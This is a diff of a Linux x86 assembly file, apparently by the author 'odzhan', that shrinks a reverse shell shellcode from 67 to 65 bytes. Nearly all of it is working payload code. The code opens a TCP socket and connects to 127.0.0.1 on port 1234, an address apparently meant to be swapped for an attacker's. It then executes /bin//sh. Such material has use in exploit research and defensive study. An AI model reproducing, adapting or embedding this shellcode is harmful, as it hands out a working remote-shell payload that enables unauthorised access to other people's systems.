@@ -28,19 +28,18 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
 
-; 67 byte reverse shell for linux/x86
+; 65 byte reverse shell for linux/x86
 ; odzhan
 
     bits 32
     
     ; step 1, create a socket
-    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);    
-    xor    ebx, ebx          ; ebx=0
-    mul    ebx               ; eax=0, edx=0
-    mov    al, 0x66          ; eax      = SYS_socketcall
-    inc    ebx               ; ebx      = SYS_socket
+    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+    push   0x66              ; eax      = SYS_socketcall
+    pop    eax
+    cdq    
     push   edx               ; protocol = IPPROTO_IP
-    push   ebx               ; type     = SOCK_STREAM
+    push   1                 ; type     = SOCK_STREAM
     push   2                 ; family   = AF_INET
     mov    ecx, esp          ; ecx      = &args
     int    0x80
@@ -61,7 +60,7 @@ c_dup:
     ; step 3, connect to remote host
     ; connect (s, &sa, sizeof(sa));   
     push   0x0100007f        ; 127.0.0.1
-    push   0xD2040002        ; 1234, AF_INET
+    push   0xD2040002        ; htons(1234), AF_INET
     mov    ecx, esp
     
     mov    al, 0x66          ; eax=SYS_socketcall    
@@ -74,11 +73,11 @@ c_dup:
     int    0x80
     
     ; step 4, execute /bin/sh
-    ; execve("/bin//sh", NULL, NULL);    
+    ; execve("/bin//sh", 0, 0);    
     mov    al, 0xb           ; eax=SYS_execve
     push   edx               ; '\0'
     push   '//sh'            ; 
     push   '/bin'            ; 
     mov    ebx, esp          ; ebx="/bin//sh", 0
-    xor    ecx, ecx          ; ecx=0 argv=0
+    xor    ecx, ecx
     int    0x80              ; exec SYS_execve
